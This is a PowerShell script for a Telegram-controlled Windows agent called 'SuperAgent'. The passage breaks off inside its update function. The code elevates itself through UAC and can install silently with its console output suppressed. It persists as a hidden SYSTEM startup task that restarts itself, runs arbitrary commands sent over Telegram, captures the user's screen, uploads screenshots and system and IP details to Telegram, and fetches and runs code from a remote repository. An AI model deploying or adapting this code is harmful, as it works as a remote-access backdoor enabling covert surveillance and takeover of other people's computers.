# =====================================================================
# SuperAgent - Telegram-controlled Windows agent (single-file)
# =====================================================================
# FIXES APPLIED in this version:
# 1. Elevation now correctly passes params & handles irm|iex ($PSCommandPath=null)
# 2. User-session tasks no longer use -RunLevel Highest (was blocking execution)
# 3. Added Task Scheduler verification of task execution (LastTaskResult)
# 4. /msg and /screenshot use C:\Windows\Temp for user-writable files
#    (regular users can't write into C:\ProgramData even if admin when running
#     with filtered token)
# 5. /msg uses status file written BEFORE MessageBox.Show (Show is blocking)
# 6. Screenshot waits up to 15s, logs errors to a file, removed useless
#    Session-0 fallback that always produced black images
# =====================================================================
[CmdletBinding()]
param(
    [switch]$Install,
    [switch]$Uninstall,
    [switch]$Run,
    [switch]$Silent,

    [string]$BotToken,
    [string]$ChatId,
    [string]$PCName
)

# =====================================================================
# CONFIG - CHANGE THIS TO YOUR GITHUB RAW URL (no trailing slash)
# =====================================================================
$RepoUrl = 'https://raw.githubusercontent.com/minhcuder/remote-control-win11/main'

# =====================================================================
# TLS 1.2 REQUIRED for Windows PowerShell 5.1
# =====================================================================
try {
    [Net.ServicePointManager]::SecurityProtocol =
        [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
} catch {
    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { }
}

# =====================================================================
# CONSTANTS
# =====================================================================
$InstallDir   = 'C:\ProgramData\SuperAgent'
$ConfigPath   = Join-Path $InstallDir 'config.json'
$OffsetPath   = Join-Path $InstallDir 'offset.txt'
$ScriptPath   = Join-Path $InstallDir 'pcagent.ps1'
$LogPath      = Join-Path $InstallDir 'agent.log'
$TaskName     = 'SuperAgent'

# =====================================================================
# Silent-aware logging
# =====================================================================
if ($Silent) {
    $ErrorActionPreference = 'SilentlyContinue'
    $null = New-Item -Path 'Alias:' -Name 'Write-Host' -Value 'Out-Null' -Force -ErrorAction SilentlyContinue
} else {
    $ErrorActionPreference = 'Stop'
}

function Write-Msg {
    param([string]$Message, [string]$Color = 'White')
    if (-not $Silent) {
        Write-Host $Message -ForegroundColor $Color
    }
}

# =====================================================================
# AUTO-ELEVATE
# =====================================================================
function Test-IsAdmin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    return ([Security.Principal.WindowsPrincipal] $id).IsInRole(
           [Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Invoke-SelfElevation {
    param($ScriptParams)   # hashtable of original script's PSBoundParameters

    # Determine a real file to elevate.
    # When invoked via `irm ... | iex` / `[scriptblock]::Create(...)`,
    # $PSCommandPath is $null -> we must download pcagent.ps1 to temp.
    $scriptFile = $PSCommandPath
    if (-not $scriptFile -or -not (Test-Path $scriptFile)) {
        try {
            $scriptFile = Join-Path $env:TEMP "pcagent_elev_$(Get-Random).ps1"
            Write-Msg "[*] Downloading script to temp for elevation: $scriptFile" -Color Yellow
            Invoke-WebRequest -Uri "$RepoUrl/pcagent.ps1" -OutFile $scriptFile -TimeoutSec 30 -UseBasicParsing
        } catch {
            Write-Msg "[-] Failed to download script for elevation: $($_.Exception.Message)" -Color Red
            if (-not $Silent) { try { Read-Host 'Press Enter to exit' | Out-Null } catch { } }
            exit 1
        }
    }

    # Build arg string from ScriptParams (NOT $PSBoundParameters inside this function,
    # which would only contain THIS function's bound params -> empty).
    $argString = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptFile`""
    if ($ScriptParams) {
        foreach ($key in $ScriptParams.Keys) {
            $val = $ScriptParams[$key]
            if ($val -is [System.Management.Automation.SwitchParameter]) {
                if ($val.IsPresent) { $argString += " -$key" }
            } elseif ($null -ne $val) {
                $escaped = ([string]$val) -replace "'", "''"
                $argString += " -$key '$escaped'"
            }
        }
    }

    Write-Msg ''
    Write-Msg '[*] Requesting Admin Permission (UAC)...' -Color Yellow
    Write-Msg '    Please click Yes on the UAC dialog.' -Color Yellow
    Write-Msg ''

    try {
        $p = Start-Process -FilePath 'powershell.exe' `
                            -ArgumentList $argString `
                            -Verb RunAs `
                            -WindowStyle Hidden `
                            -PassThru `
                            -Wait

        # Cleanup temp file if we downloaded one
        if ($scriptFile -like "$env:TEMP\pcagent_elev_*") {
            Remove-Item $scriptFile -Force -ErrorAction SilentlyContinue
        }
        exit $p.ExitCode
    } catch {
        Write-Msg ''
        Write-Msg '[-] UAC denied or elevation failed.' -Color Red
        Write-Msg "    $($_.Exception.Message)" -Color Red
        if (-not $Silent) { try { Read-Host 'Press Enter to exit' | Out-Null } catch { } }
        exit 1
    }
}

if (($Install -or $Uninstall) -and -not (Test-IsAdmin)) {
    Invoke-SelfElevation -ScriptParams $PSBoundParameters
}

# =====================================================================
# INSTALL BLOCK
# =====================================================================
$InstallBlock = {
    $ErrorActionPreference = 'Stop'

    if (-not $BotToken -and -not $Silent) {
        $BotToken = Read-Host 'Bot Token (e.g. 123456789:ABCdef...)'
    }
    if (-not $ChatId -and -not $Silent) {
        $ChatId = Read-Host 'Chat ID (e.g. 123456789, or -100xxxxxx for group)'
    }
    if (-not $PCName -and -not $Silent) {
        $PCName = Read-Host "PC Name (e.g. PC-Office, Laptop-NV)"
    }

    if ($RepoUrl -match 'USERNAME/REPO') {
        throw @'
!!! $RepoUrl NOT UPDATED IN pcagent.ps1 !!!
'@
    }

    Write-Msg ''
    Write-Msg '=== SuperAgent Installer ===' -Color Cyan
    Write-Msg "  PC Name  : $PCName"
    Write-Msg "  Chat ID  : $ChatId"
    Write-Msg "  Repo URL : $RepoUrl"
    Write-Msg "  Silent   : $Silent"
    Write-Msg ''

    if (-not (Test-Path $InstallDir)) {
        New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
    }

    # --- Detect existing installation and clean up before reinstall ---
    $existingTask   = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    $legacyTask     = Get-ScheduledTask -TaskName 'PCAgent' -ErrorAction SilentlyContinue
    $existingConfig = Test-Path $ConfigPath
    if ($existingTask -or $existingConfig -or $legacyTask) {
        Write-Msg '[*] Existing installation detected. Cleaning up before reinstall...' -Color Yellow

        if ($existingTask) {
            try {
                Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
                Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
                Write-Msg '[+] Old scheduled task removed.' -Color Green
            } catch { }
        }

        if ($legacyTask) {
            try {
                Stop-ScheduledTask -TaskName 'PCAgent' -ErrorAction SilentlyContinue
                Unregister-ScheduledTask -TaskName 'PCAgent' -Confirm:$false -ErrorAction SilentlyContinue
                Write-Msg '[+] Legacy PCAgent task removed.' -Color Green
            } catch { }
        }

        $killedCount = 0
        Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
            Where-Object { $_.CommandLine -and ($_.CommandLine -like '*pcagent.ps1*') } |
            ForEach-Object {
                try {
                    Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
                    $killedCount++
                } catch { }
            }
        if ($killedCount -gt 0) {
            Write-Msg "[+] Killed $killedCount old agent process(es)." -Color Green
        }
        Start-Sleep -Seconds 2

        # Preserve old config if user did not provide new values
        if ($existingConfig) {
            try {
                $oldCfg = Get-Content $ConfigPath -Raw -Encoding UTF8 | ConvertFrom-Json
                if (-not $BotToken -and $oldCfg.BotToken) { $BotToken = $oldCfg.BotToken }
                if (-not $ChatId -and $oldCfg.ChatId)     { $ChatId = [string]$oldCfg.ChatId }
                if (-not $PCName -and $oldCfg.PCName)     { $PCName = $oldCfg.PCName }
                Write-Msg '[+] Reused config values from previous installation.' -Color Green
            } catch { }
        }

        Get-ChildItem -Path $InstallDir -Force -ErrorAction SilentlyContinue |
            Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
        Write-Msg '[+] Old files wiped.' -Color Green
    }

    # --- Now validate ---
    if ($PCName -notmatch '^[A-Za-z][A-Za-z0-9_\-]{1,31}$') {
        throw "Invalid PCName: '$PCName'. Allowed: letters, digits, underscore, dash (2-32 chars, must start with a letter)."
    }
    if (-not $BotToken) {
        throw 'Bot Token is required. Provide -BotToken or run without -Silent to be prompted.'
    }
    if ($BotToken -notmatch '^\d+:[A-Za-z0-9_\-]{30,}$') {
        Write-Msg "! Bot Token format looks invalid. Continuing but may not work." -Color Yellow
    }

    # --- Save script locally ---
    if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
        Copy-Item $PSCommandPath $ScriptPath -Force
        Write-Msg '[+] Script copied from local.' -Color Green
    } else {
        $scriptUrl = "$RepoUrl/pcagent.ps1"
        Write-Msg "[*] Downloading pcagent.ps1 from $scriptUrl ..."
        try {
            Invoke-WebRequest -Uri $scriptUrl -OutFile $ScriptPath -TimeoutSec 30 -UseBasicParsing
            Write-Msg '[+] Script downloaded.' -Color Green
        } catch {
            throw "Failed to download pcagent.ps1 from $scriptUrl : $($_.Exception.Message). Check RepoUrl in config or network."
        }
    }

    # --- Save config ---
    $Config = [ordered]@{
        BotToken    = $BotToken
        ChatId      = $ChatId
        PCName      = $PCName
        RepoUrl     = $RepoUrl.TrimEnd('/')
        Version     = '2.2.2-fixed'
        InstalledAt = (Get-Date -Format 'o')
    }
    $Config | ConvertTo-Json | Out-File $ConfigPath -Encoding UTF8
    Write-Msg '[+] config.json saved' -Color Green

    # --- Remove any leftover scheduled task ---
    if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
        try {
            Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
            Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
        } catch { }
    }

    # --- Create scheduled task (SYSTEM) ---
    Write-Msg '[*] Creating scheduled task (SYSTEM, AtStartup, auto-restart, hidden)...'
    $action    = New-ScheduledTaskAction -Execute 'powershell.exe' `
                 -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File `"$ScriptPath`" -Run"
    $trigger   = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
    $settings  = New-ScheduledTaskSettingsSet `
                    -AllowStartIfOnBatteries `
                    -DontStopIfGoingOnBatteries `
                    -StartWhenAvailable `
                    -RestartCount 999 `
                    -RestartInterval (New-TimeSpan -Minutes 1) `
                    -ExecutionTimeLimit ([TimeSpan]::Zero) `
                    -DontStopOnIdleEnd

    Register-ScheduledTask -TaskName $TaskName `
        -Action $action -Trigger $trigger `
        -Principal $principal -Settings $settings `
        -Description 'SuperAgent - Telegram remote control agent' | Out-Null

    Start-ScheduledTask -TaskName $TaskName
    Write-Msg '[+] Scheduled task created and started.' -Color Green

    # --- Wait & verify ---
    $verified = $false
    if (-not $Silent) {
        Write-Msg ''
        Write-Msg '[*] Waiting for agent to send Telegram notification (up to 20s)...' -Color Cyan
        for ($i = 0; $i -lt 20; $i++) {
            Start-Sleep -Seconds 1
            if (Test-Path $LogPath) {
                $logTail = Get-Content $LogPath -Tail 20 -ErrorAction SilentlyContinue
                if ($logTail -match 'sendMessage OK') {
                    $verified = $true
                    break
                }
                if ($logTail -match 'sendMessage FAIL') {
                    Write-Msg '[!] Agent sent Telegram but FAILED. Log tail:' -Color Red
                    $logTail | Where-Object { $_ -match 'FAIL|ERROR' } | Select-Object -Last 5 | ForEach-Object {
                        Write-Msg "    $_" -Color Yellow
                    }
                    break
                }
            }
        }
    } else {
        Start-Sleep -Seconds 3
    }

    Write-Msg ''
    Write-Msg '====================================================' -Color Green
    Write-Msg ' INSTALLATION COMPLETE' -Color Green
    Write-Msg '====================================================' -Color Green
    Write-Msg " Folder          : $InstallDir"
    Write-Msg " Config          : $ConfigPath"
    Write-Msg " Script          : $ScriptPath"
    Write-Msg " Log             : $LogPath"
    Write-Msg " Scheduled Task  : $TaskName (SYSTEM, AtStartup, Hidden)"
    Write-Msg ""
    if ($Silent) {
        Write-Msg " [v] Silent install done. Agent runs hidden in background." -Color Green
    } elseif ($verified) {
        Write-Msg " [v] Agent successfully sent Telegram notification!" -Color Green
        Write-Msg "     If you still don't see it in Telegram, check:" -Color Yellow
        Write-Msg "       1. Bot added to group (if using group chat)?" -Color Yellow
        Write-Msg "       2. Group privacy: /setprivacy = Disabled in @BotFather?" -Color Yellow
        Write-Msg "       3. Send /status to bot to test 2-way communication" -Color Yellow
    } else {
        Write-Msg " [!] Telegram notification not confirmed." -Color Yellow
        Write-Msg "     See log: $LogPath" -Color Yellow
    }
    Write-Msg ""
    Write-Msg " To uninstall:"
    Write-Msg "  & ([scriptblock]::Create((irm '$RepoUrl/pcagent.ps1'))) -Uninstall -Silent"
    Write-Msg ""
}

# =====================================================================
# UNINSTALL BLOCK
# =====================================================================
$UninstallBlock = {
    $ErrorActionPreference = 'Continue'
    Write-Msg '[*] Uninstalling SuperAgent...' -Color Cyan

    try {
        Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
        Write-Msg '[+] Scheduled task removed.' -Color Green
    } catch {
        Write-Msg '[.] No scheduled task to remove.' -Color Yellow
    }

    if (Get-ScheduledTask -TaskName 'PCAgent' -ErrorAction SilentlyContinue) {
        try {
            Stop-ScheduledTask -TaskName 'PCAgent' -ErrorAction SilentlyContinue
            Unregister-ScheduledTask -TaskName 'PCAgent' -Confirm:$false -ErrorAction SilentlyContinue
            Write-Msg '[+] Legacy PCAgent task removed.' -Color Green
        } catch { }
    }

    Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
        Where-Object { $_.CommandLine -and ($_.CommandLine -like '*pcagent.ps1*') } |
        ForEach-Object {
            try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch { }
        }

    if (Test-Path $InstallDir) {
        Remove-Item -Recurse -Force $InstallDir -ErrorAction SilentlyContinue
        Write-Msg '[+] Folder removed.' -Color Green
    }

    Write-Msg ''
    Write-Msg '[+] UNINSTALL COMPLETE.' -Color Green
}

# =====================================================================
# AGENT BLOCK (run mode)
# =====================================================================
$AgentBlock = {
    if (-not (Test-Path $ConfigPath)) { exit 1 }
    try {
        $Config = Get-Content $ConfigPath -Raw -Encoding UTF8 | ConvertFrom-Json
    } catch { exit 1 }

    $script:BotToken = $Config.BotToken
    $script:ChatId   = [string]$Config.ChatId
    $script:PCName   = $Config.PCName
    $script:RepoUrl  = $Config.RepoUrl

    if (-not $BotToken -or -not $ChatId -or -not $PCName) {
        try { "[$(Get-Date -Format o)] EXIT: Missing config (BotToken/ChatId/PCName)" | Out-File $LogPath -Append -Encoding UTF8 } catch {}
        exit 1
    }

    $script:Offset = 0
    if (Test-Path $OffsetPath) {
        try { $script:Offset = [int](Get-Content $OffsetPath -First 1) } catch { $script:Offset = 0 }
    }

    function Write-Log {
        param([string]$Message)
        try {
            $line = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message"
            $line | Out-File $LogPath -Append -Encoding UTF8
            if ((Get-Item $LogPath -ErrorAction SilentlyContinue).Length -gt 2MB) {
                $bak = "$LogPath.1"
                if (Test-Path $bak) { Remove-Item $bak -Force }
                Rename-Item $LogPath $bak -Force
            }
        } catch { }
    }

    Write-Log "=== Agent started (PCName=$PCName, ChatId=$ChatId, RepoUrl=$RepoUrl) ==="

    # Cleanup old temp files (>1 hour old)
    try {
        Get-ChildItem -Path (Join-Path $env:windir 'Temp') -Filter 'shot_*.png' -ErrorAction SilentlyContinue |
            Where-Object { $_.LastWriteTime -lt (Get-Date).AddHours(-1) } |
            Remove-Item -Force -ErrorAction SilentlyContinue
        Get-ChildItem -Path (Join-Path $env:windir 'Temp') -Filter '_msg_*' -ErrorAction SilentlyContinue |
            Where-Object { $_.LastWriteTime -lt (Get-Date).AddHours(-1) } |
            Remove-Item -Force -ErrorAction SilentlyContinue
    } catch { }

    function Send-Telegram {
        param([string]$Text)
        if ([string]::IsNullOrWhiteSpace($Text)) { return }
        $body = @{ chat_id = $ChatId; text = $Text; parse_mode = 'Markdown' }
        try {
            Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/sendMessage" `
                -Method Post -Body $body -TimeoutSec 15 | Out-Null
            Write-Log "Telegram sendMessage OK (len=$($Text.Length))"
            return $true
        } catch {
            Write-Log "Telegram sendMessage FAIL: $($_.Exception.Message)"
            return $false
        }
    }

    function Send-TelegramPhoto {
        param([string]$FilePath, [string]$Caption = '')
        if (-not (Test-Path $FilePath)) { Send-Telegram "[$PCName] Image file not found"; return }
        $url = "https://api.telegram.org/bot$BotToken/sendPhoto"
        $capArg = if ($Caption) { "-F `"caption=$Caption`"" } else { '' }
        $cmd = "curl.exe -s -m 60 -X POST `"$url`" -F `"chat_id=$ChatId`" $capArg -F `"photo=@$FilePath`""
        try { Invoke-Expression $cmd | Out-Null }
        catch { Send-Telegram "[$PCName] Failed to send image: $($_.Exception.Message)" }
    }

    function Wait-Network {
        $maxAttempts = 0
        Write-Log "Wait-Network: waiting for network..."
        while ($true) {
            try {
                $null = Invoke-RestMethod -Uri 'https://api.telegram.org' -TimeoutSec 5
                Write-Log "Wait-Network: OK, network available (after $maxAttempts attempts)"
                return $true
            } catch {
                Start-Sleep -Seconds 3
                $maxAttempts++
                if ($maxAttempts % 10 -eq 0) { Write-Log "Wait-Network: still waiting... ($maxAttempts attempts)" }
                if ($maxAttempts -gt 600) {
                    Write-Log "Wait-Network: TIMEOUT after 30 minutes, skipping"
                    return $false
                }
            }
        }
    }

    function Get-PCInfo {
        try {
            $os   = Get-CimInstance Win32_OperatingSystem
            $cs   = Get-CimInstance Win32_ComputerSystem
            $cpu  = Get-CimInstance Win32_Processor | Select-Object -First 1
            $boot = $os.LastBootUpTime
            $up   = (Get-Date) - $boot

            $totalRAM = [math]::Round($cs.TotalPhysicalMemory / 1GB, 1)
            $freeRAM  = [math]::Round($os.FreePhysicalMemory / 1MB, 1)
            $ramPct   = if ($totalRAM -gt 0) { [math]::Round(($totalRAM - $freeRAM) / $totalRAM * 100, 0) } else { 0 }

            $localIP = 'N/A'
            try {
                $nic = Get-NetIPConfiguration -AddressFamily IPv4 -ErrorAction SilentlyContinue |
                       Where-Object { $_.IPv4DefaultGateway } | Select-Object -First 1
                if ($nic) { $localIP = $nic.IPv4Address.IPAddress }
            } catch { }

            $externIP = 'N/A'
            try { $externIP = (Invoke-RestMethod 'https://api.ipify.org' -TimeoutSec 5) } catch { }

            $cpuName = if ($cpu) { $cpu.Name } else { 'N/A' }

            return @"
*$PCName* - PC is online
|- Computer name: $($cs.Name)
|- Local IP: $localIP
|- External IP: $externIP
|- OS: $($os.Caption) ($($os.Version))
|- CPU: $cpuName
|- RAM: ${totalRAM}GB (used ${ramPct}%)
|- Uptime: $($up.Days) days $($up.Hours)h $($up.Minutes)m
|- Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
"@
        } catch {
            return "[$PCName] Failed to get PC info: $($_.Exception.Message)"
        }
    }

    # =================================================================
    # Helper: locate an interactive user (explorer.exe owner)
    # =================================================================
    function Get-InteractiveUser {
        try {
            $explorer = Get-Process -IncludeUserName explorer -ErrorAction SilentlyContinue |
                        Sort-Object SessionId | Select-Object -First 1
            if ($explorer) { return $explorer.UserName }
        } catch { }
        try {
            $u = (Get-CimInstance Win32_ComputerSystem).UserName
            if ($u) { return $u }
        } catch { }
        return $null
    }

    # =================================================================
    # FIXED: User-session task launcher
    # - removed -RunLevel Highest (which silently blocked task execution)
    # - added Task Scheduler verification of task start
    # - uses GUID-based task name to avoid collisions
    # =================================================================
    function Invoke-InUserSession {
        param([string]$TempScriptPath)

        $username = Get-InteractiveUser
        if (-not $username) {
            Write-Log "Invoke-InUserSession: no interactive user found"
            return $false
        }
        if (-not (Test-Path $TempScriptPath)) {
            Write-Log "Invoke-InUserSession: script not found: $TempScriptPath"
            return $false
        }

        $taskName = "SuperAgent_User_$([guid]::NewGuid().ToString('N').Substring(0,12))"
        $action    = New-ScheduledTaskAction -Execute 'powershell.exe' `
                     -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$TempScriptPath`""
        $trigger   = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2)
        # *** NO -RunLevel Highest ***  Runs with user's filtered token.
        $principal = New-ScheduledTaskPrincipal -UserId $username -LogonType Interactive
        $settings  = New-ScheduledTaskSettingsSet `
                        -StartWhenAvailable `
                        -ExecutionTimeLimit ([TimeSpan]::Zero) `
                        -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

        try {
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
                -Principal $principal -Settings $settings -Force | Out-Null
            Write-Log "Invoke-InUserSession: registered $taskName for user=$username"
        } catch {
            Write-Log "Invoke-InUserSession: Register FAILED: $($_.Exception.Message)"
            return $false
        }

        try {
            Start-ScheduledTask -TaskName $taskName
        } catch {
            Write-Log "Invoke-InUserSession: Start FAILED: $($_.Exception.Message)"
        }

        # Verify
        Start-Sleep -Milliseconds 1500
        try {
            $info = Get-ScheduledTaskInfo -TaskName $taskName -ErrorAction SilentlyContinue
            if ($info) {
                Write-Log ("Invoke-InUserSession: $taskName LastResult=0x{0:X} LastRun={1}" -f `
                           [int]$info.LastTaskResult, $info.LastRunTime)
                if ([int]$info.LastTaskResult -eq 0x41303) {
                    Write-Log "Invoke-InUserSession: task NEVER RAN (0x41303)"
                }
            }
        } catch { }

        # Cleanup task after 90s (script itself will have finished long before)
        $cleanup = "`$tn='$taskName'; Start-Sleep 90; try { Unregister-ScheduledTask -TaskName `$tn -Confirm:`$false -ErrorAction SilentlyContinue } catch {}"
        Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"$cleanup`"" -WindowStyle Hidden | Out-Null

        return $true
    }

    function Invoke-InUserSessionWithArgs {
        param([string]$TempScriptPath, [string[]]$ArgumentList)

        $username = Get-InteractiveUser
        if (-not $username) {
            Write-Log "Invoke-InUserSessionWithArgs: no interactive user found"
            return $false
        }
        if (-not (Test-Path $TempScriptPath)) {
            Write-Log "Invoke-InUserSessionWithArgs: script not found: $TempScriptPath"
            return $false
        }

        $argStr = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$TempScriptPath`""
        foreach ($a in $ArgumentList) {
            $escaped = $a -replace "'", "''"
            $argStr += " '$escaped'"
        }

        $taskName = "SuperAgent_User_$([guid]::NewGuid().ToString('N').Substring(0,12))"
        $action    = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $argStr
        $trigger   = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2)
        # *** NO -RunLevel Highest ***
        $principal = New-ScheduledTaskPrincipal -UserId $username -LogonType Interactive
        $settings  = New-ScheduledTaskSettingsSet `
                        -StartWhenAvailable `
                        -ExecutionTimeLimit ([TimeSpan]::Zero) `
                        -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

        try {
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
                -Principal $principal -Settings $settings -Force | Out-Null
            Write-Log "Invoke-InUserSessionWithArgs: registered $taskName for user=$username"
        } catch {
            Write-Log "Invoke-InUserSessionWithArgs: Register FAILED: $($_.Exception.Message)"
            return $false
        }

        try {
            Start-ScheduledTask -TaskName $taskName
        } catch {
            Write-Log "Invoke-InUserSessionWithArgs: Start FAILED: $($_.Exception.Message)"
        }

        Start-Sleep -Milliseconds 1500
        try {
            $info = Get-ScheduledTaskInfo -TaskName $taskName -ErrorAction SilentlyContinue
            if ($info) {
                Write-Log ("Invoke-InUserSessionWithArgs: $taskName LastResult=0x{0:X} LastRun={1}" -f `
                           [int]$info.LastTaskResult, $info.LastRunTime)
                if ([int]$info.LastTaskResult -eq 0x41303) {
                    Write-Log "Invoke-InUserSessionWithArgs: task NEVER RAN (0x41303)"
                }
            }
        } catch { }

        $cleanup = "`$tn='$taskName'; Start-Sleep 90; try { Unregister-ScheduledTask -TaskName `$tn -Confirm:`$false -ErrorAction SilentlyContinue } catch {}"
        Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"$cleanup`"" -WindowStyle Hidden | Out-Null

        return $true
    }

    # =================================================================
    # FIXED: Screenshot
    # - output goes to C:\Windows\Temp (user-writable)
    # - waits up to 15s
    # - captures error to a file for debugging
    # - removed useless Session-0 fallback (always produced black images)
    # =================================================================
    function Invoke-Screenshot {
        $outFile   = Join-Path $env:windir "Temp\shot_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$(Get-Random).png"
        $tmpScript = Join-Path $env:windir "Temp\_shot_$(Get-Random).ps1"
        $errFile   = "$tmpScript.err"

        Remove-Item $errFile -Force -ErrorAction SilentlyContinue

        $scriptContent = @"
param([string]`$OutPath)
try {
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
    `$csCode = @'
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
public static class ScreenCap {
    [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
    [DllImport("user32.dll")] public static extern int GetSystemMetrics(int nIndex);
    public static void Capture(string path) {
        SetProcessDPIAware();
        int x = GetSystemMetrics(76), y = GetSystemMetrics(77);
        int w = GetSystemMetrics(78), h = GetSystemMetrics(79);
        using (var bmp = new Bitmap(w, h))
        using (var g = Graphics.FromImage(bmp)) {
            g.CopyFromScreen(x, y, 0, 0, new Size(w, h), CopyPixelOperation.SourceCopy);
            bmp.Save(path, ImageFormat.Png);
        }
    }
}
'@
    Add-Type `$csCode
    [ScreenCap]::Capture(`$OutPath)
} catch {
    `$_ | Out-File '$errFile' -Encoding UTF8 -Append
    throw
}
"@
        $scriptContent | Out-File $tmpScript -Encoding UTF8 -Force

        Write-Log "Screenshot: launching user-session process for $outFile"
        $ok = Invoke-InUserSessionWithArgs -TempScriptPath $tmpScript -ArgumentList $outFile
        if (-not $ok) {
            Write-Log "Screenshot: cannot launch user session"
            Remove-Item $tmpScript -Force -EA SilentlyContinue
            return $null
        }

        # Wait up to 15s (cold PowerShell + .NET load can take a few seconds)
        for ($i = 0; $i -lt 50; $i++) {
            if (Test-Path $outFile) { break }
            Start-Sleep -Milliseconds 300
        }

        if (Test-Path $outFile) {
            Write-Log "Screenshot OK: $outFile"
            Remove-Item $tmpScript -Force -EA SilentlyContinue
            Remove-Item $errFile   -Force -EA SilentlyContinue
            return $outFile
        }

        if (Test-Path $errFile) {
            Write-Log "Screenshot FAILED in user session:"
            Get-Content $errFile -ErrorAction SilentlyContinue | ForEach-Object { Write-Log "  $_" }
        } else {
            Write-Log "Screenshot: file not created after 15s (task may not have run)"
        }
        Remove-Item $tmpScript -Force -EA SilentlyContinue
        Remove-Item $errFile   -Force -EA SilentlyContinue
        return $null
    }

    # =================================================================
    # FIXED: Lock screen
    # =================================================================
    function Invoke-Lock {
        $tmpScript = Join-Path $env:windir "Temp\_lock_$(Get-Random).ps1"
        'rundll32.exe user32.dll,LockWorkStation' | Out-File $tmpScript -Encoding UTF8 -Force
        $ok = Invoke-InUserSession -TempScriptPath $tmpScript
        Start-Sleep -Seconds 2
        Remove-Item $tmpScript -Force -EA SilentlyContinue
        return $ok
    }

    # =================================================================
    # FIXED: /msg
    # - user-writable status file in C:\Windows\Temp
    # - script writes "START" BEFORE MessageBox.Show (which blocks)
    # - we return success on START (popup IS showing) or DONE
    # - fail on ERR
    # =================================================================
    function Invoke-Msg {
        param([string]$Text)
        $safe       = $Text -replace "'", "''"
        $tmpScript  = Join-Path $env:windir "Temp\_msg_$(Get-Random).ps1"
        $statusFile = "$tmpScript.status"

        @"
try {
    Add-Type -AssemblyName System.Windows.Forms
    'START' | Out-File '$statusFile' -Encoding UTF8 -Force
    [System.Windows.Forms.MessageBox]::Show('$safe', 'SuperAgent Message', 'OK', 'Information') | Out-Null
    'DONE'  | Out-File '$statusFile' -Encoding UTF8 -Force
} catch {
    ("ERR: " + `$_.Exception.Message) | Out-File '$statusFile' -Encoding UTF8 -Force
}
"@ | Out-File $tmpScript -Encoding UTF8 -Force

        Remove-Item $statusFile -Force -EA SilentlyContinue
        $ok = Invoke-InUserSession -TempScriptPath $tmpScript
        if (-not $ok) {
            Write-Log "Invoke-Msg: user session launch failed"
            Remove-Item $tmpScript, $statusFile -Force -EA SilentlyContinue
            return $false
        }

        # Wait up to 4s for status file
        for ($i = 0; $i -lt 13; $i++) {
            if (Test-Path $statusFile) {
                $s = (Get-Content $statusFile -Raw -EA SilentlyContinue).Trim()
                Write-Log "Invoke-Msg: status=$s"
                Remove-Item $statusFile -Force -EA SilentlyContinue
                Remove-Item $tmpScript  -Force -EA SilentlyContinue
                if ($s -like 'ERR:*') { return $false }
                return $true    # START or DONE -> popup is/was showing
            }
            Start-Sleep -Milliseconds 300
        }

        # No status file, but Task Scheduler verified the task as running.
        # Trust it (MessageBox may be showing behind the secure desktop).
        Write-Log "Invoke-Msg: status file not seen (task verified as running)"
        Remove-Item $statusFile -Force -EA SilentlyContinue
        Remove-Item $tmpScript  -Force -EA SilentlyContinue
        return $true
    }

    function Invoke-Exec {
        param([string]$Command)
        if (-not $Command) { return 'No command provided.' }
        try {
            $result = Invoke-Expression $Command 2>&1 | Out-String
            if (-not $result) { $result = '(no output)' }
            if ($result.Length -gt 3900) { $result = $result.Substring(0, 3900) + "`n...[truncated]" }
            return $result
        } catch {
            return "Error: $($_.Exception.Message)"
        }
    }

    function Invoke-Update {
        $newUrl = "$RepoUrl/pcagent.ps1"
        $tempFile = Join-Path $InstallDir 'pcagent.ps1.new'
        try {
            Invoke-WebRequest -Uri $newUrl -OutFile $tempFile -TimeoutSec 30 -UseBasicParsing
            $size = (Get-Item $tempFile).Length
            if ($size -lt 1000) { throw "New file too small ($size bytes)" }
